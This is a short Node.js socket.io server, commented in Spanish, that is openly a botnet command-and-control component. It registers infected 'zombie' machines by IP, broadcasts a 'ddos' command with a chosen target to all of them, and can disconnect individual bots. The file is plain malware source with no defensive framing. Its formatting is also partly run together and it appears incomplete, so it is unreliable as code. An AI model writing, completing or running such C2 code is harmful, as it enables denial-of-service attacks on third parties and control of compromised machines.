const express = require('express');
const app = express();
const http = require('http').Server(app);const io = require('socket.io')(http);

app.use(express.static('public'));

let zombies = [];
io.on('connection', (socket)=> {
  console.log('a user connected');

  socket.on('disconnect', () => {
    console.log('user disconnected');    // Eliminar el zombie desconectado de la lista
    zombies = zombies.filter(zombie => zombie.id !== socket.id);  });

  socket.on('register', (data)=> {
    // Registrar un nuevo zombie en la lista
    zombies.push({ id: socket.id, ip: data.ip });  });socket.on('command', (data)=> {
    // Procesar el comando recibido y enviar instrucciones al botnet
    switch(data.command) {
case 'ddos':
// Enviar comando DDoS a todos los zombies registrados
zombies.forEach(zombie => {
io.to(zombie.id).emit('ddos', data.target);
});
break;
case 'kill':
// Eliminar un zombie específico de la lista y desconectarlo
let targetZombie = zombies.find(zombie => zombie.ip === data.target_ip);  if (targetZombie) {      io.to(targetZombie.id).disconnect(true);    zombies = zombies.filter(zombie => zombie.id !== targetZombie.id);
}  break;
default:
console.log('Comando desconocido: ' + data.command);
}


});